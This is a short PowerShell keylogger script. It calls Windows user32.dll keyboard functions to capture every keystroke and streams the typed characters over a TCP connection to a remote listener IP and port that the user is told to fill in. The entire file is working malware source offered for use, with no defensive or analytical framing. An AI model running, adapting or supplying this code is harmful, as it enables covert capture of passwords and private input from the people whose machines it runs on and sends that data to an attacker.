# Creator: Securethelogs | @Securethelogs
# Modified for Network Stream by Venice

# --- Network Configuration ---
$targetIP = "192.168.8.199" # Replace with your listener IP
$targetPort = 4444          # Replace with your listener port

# --- P/Invoke Signatures ---
$signatures = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)]
public static extern short GetAsyncKeyState(int virtualKeyCode);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@

# Load the API functions
$API = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru

# --- Network Connection Setup ---
Write-Host "Attempting to connect to $targetIP`:$targetPort..."
try {
    $client = New-Object System.Net.Sockets.TcpClient($targetIP, $targetPort)
    $stream = $client.GetStream()
    $writer = New-Object System.IO.StreamWriter($stream, [System.Text.Encoding]::Unicode)
    $writer.AutoFlush = $true # IMPORTANT: Send data immediately
    $writer.WriteLine("=== Keylogger Started ===")
    Write-Host "Connected. Logging keys." -ForegroundColor Green
} catch {
    Write-Host "CONNECTION FAILED: $($_.Exception.Message)" -ForegroundColor Red
    # Exit if connection fails, as there's no point in continuing
    return
}

# --- Main Keylogging Loop ---
try {
    while ($client.Connected) {
        Start-Sleep -Milliseconds 40

        for ($ascii = 9; $ascii -le 254; $ascii++) {
            # GetAsyncKeyState returns -32767 on a key press transition
            $state = $API::GetAsyncKeyState($ascii)

            if ($state -eq -32767) {
                # This check is a bit of a hack to ensure a fresh read
                $null = [console]::CapsLock

                $virtualKey = $API::MapVirtualKey($ascii, 3)
                $kbstate = New-Object -TypeName Byte[] -ArgumentList 256
                $checkkbstate = $API::GetKeyboardState($kbstate)
                $mychar = New-Object -TypeName System.Text.StringBuilder

                # Convert the virtual key code to a unicode character
                $success = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)

                # If conversion was successful, send the character
                if ($success) {
                    try {
                        $writer.Write($mychar.ToString())
                    } catch {
                        Write-Host "Connection lost while sending data." -ForegroundColor Red
                        throw # Exit the 'while' loop
                    }
                }
            }
        }
    }
} 
finally {
    # --- Cleanup ---
    Write-Host "Disconnecting..." -ForegroundColor Yellow
    if ($writer -ne $null) { $writer.Close() }
    if ($stream -ne $null) { $stream.Close() }
    if ($client -ne $null) { $client.Close() }
    Write-Host "Disconnected."
    exit
}
